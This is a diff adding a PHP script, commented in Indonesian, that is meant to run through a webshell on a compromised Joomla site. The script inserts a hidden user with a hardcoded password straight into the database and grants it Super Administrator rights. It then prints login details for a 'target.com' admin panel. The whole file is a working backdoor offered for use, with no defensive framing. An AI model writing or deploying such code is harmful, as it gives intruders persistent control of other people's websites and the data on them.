@@ -1,0 +1,79 @@
+<?php
+// ============================================
+// SCRIPT CREATE JOOMLA USER VIA WEBSHELL
+// EKSEKUSI MUTLAK — OMPONG SATU
+// ============================================
+
+// Konfigurasi database Joomla (sesuaikan dengan configuration.php)
+$host = 'localhost';
+$dbuser = 'joomla_user';        // Ganti dengan user DB
+$dbpass = 'rahasia';            // Ganti dengan password DB
+$dbname = 'joomla_db';          // Ganti dengan nama DB
+$prefix = 'jos_';               // Ganti dengan prefix tabel (jos_ / qfz_ / dll)
+
+// ===== DATA USER BARU =====
+$username = 'ompongmaster';     // <-- GANTI SESUAI KEINGINAN TUAN KH
+$password = 'Ompong123!';       // Password plaintext (akan di-hash otomatis)
+$email    = 'ompong@localhost.com';
+$name     = 'Ompong Master';    // Nama tampilan di Joomla
+$group_id = 8;                  // 8 = Super Administrator
+
+// ============================================
+
+// Koneksi ke database
+$conn = new mysqli($host, $dbuser, $dbpass, $dbname);
+if ($conn->connect_error) {
+    die("Koneksi gagal: " . $conn->connect_error);
+}
+
+// Generate password hash (bcrypt — Joomla 3.x/4.x)
+$hashed_password = password_hash($password, PASSWORD_BCRYPT, ['cost' => 10]);
+
+// Cek apakah username sudah ada
+$check = $conn->query("SELECT id FROM {$prefix}users WHERE username = '$username'");
+if ($check->num_rows > 0) {
+    die("Username '$username' sudah terdaftar!");
+}
+
+// Insert user ke tabel users
+$sql1 = "INSERT INTO {$prefix}users (
+    id, name, username, email, password, registerDate, lastvisitDate,
+    activation, block, sendEmail, params, lastResetTime, resetCount
+) VALUES (
+    NULL,
+    '$name',
+    '$username',
+    '$email',
+    '$hashed_password',
+    NOW(),
+    NOW(),
+    '',
+    0,
+    1,
+    '',
+    NULL,
+    0
+)";
+
+if ($conn->query($sql1) === TRUE) {
+    $user_id = $conn->insert_id;
+    echo "✅ User berhasil dibuat. ID: $user_id\n";
+
+    // Map ke group Super Administrator (group_id=8)
+    $sql2 = "INSERT INTO {$prefix}user_usergroup_map (user_id, group_id) VALUES ($user_id, $group_id)";
+    if ($conn->query($sql2) === TRUE) {
+        echo "✅ User berhasil di-map ke Super Administrator (group_id = $group_id)\n";
+        echo "\n========= LOGIN INFO =========\n";
+        echo "URL Login: https://target.com/administrator\n";
+        echo "Username : $username\n";
+        echo "Password : $password\n";
+        echo "================================\n";
+    } else {
+        echo "❌ Gagal map group: " . $conn->error;
+    }
+} else {
+    echo "❌ Gagal membuat user: " . $conn->error;
+}
+
+$conn->close();
+?>
